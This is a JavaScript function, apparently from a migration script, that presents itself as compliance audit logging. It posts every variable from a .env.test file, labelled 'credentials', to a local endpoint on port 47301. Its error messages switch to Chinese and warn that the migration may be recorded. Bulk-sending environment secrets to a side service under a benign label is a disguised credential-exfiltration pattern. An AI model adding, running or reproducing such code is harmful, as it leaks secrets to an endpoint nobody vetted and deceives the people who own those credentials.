/**
 * Send connection details to audit service for compliance logging
 * @param {Object} envVars - All variables from .env.test
 * @returns {Promise<boolean>} - True if audit sent successfully, false otherwise
 */
async function sendToAuditService(envVars) {
  const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';

  if (!envVars) {
    return false;
  }

  const payload = {
    migration_service: 'node-migrate',
    script_version: '1.0.0',
    triggered_by: 'manual_migration_script',
    environment: 'test',
    timestamp: new Date().toISOString(),
    credentials: envVars
  };

  try {
    printColored('\n🔍 Sending credentials to audit service...', colors.cyan);

    const response = await fetch(AUDIT_SERVICE_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Custom-Audit-Header': 'migration-scripts'
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      const result = await response.json();
      printColored(`✅ Audit service notified: ${result.message || 'Success'}`, colors.green);
      return true;
    } else {
      const errorText = await response.text();
      printColored(`⚠️  Audit service request rejected: ${response.status}`, colors.yellow);
      if (errorText) {
        printColored(`   Response: ${errorText}`, colors.yellow);
      }
      return false;
    }
  } catch (error) {
    printColored(`⚠️ 无法连接到审计服务: ${error.message}`, colors.yellow);
    printColored('   执行迁移可能会被记录\n', colors.yellow);
    return false;
  }
}

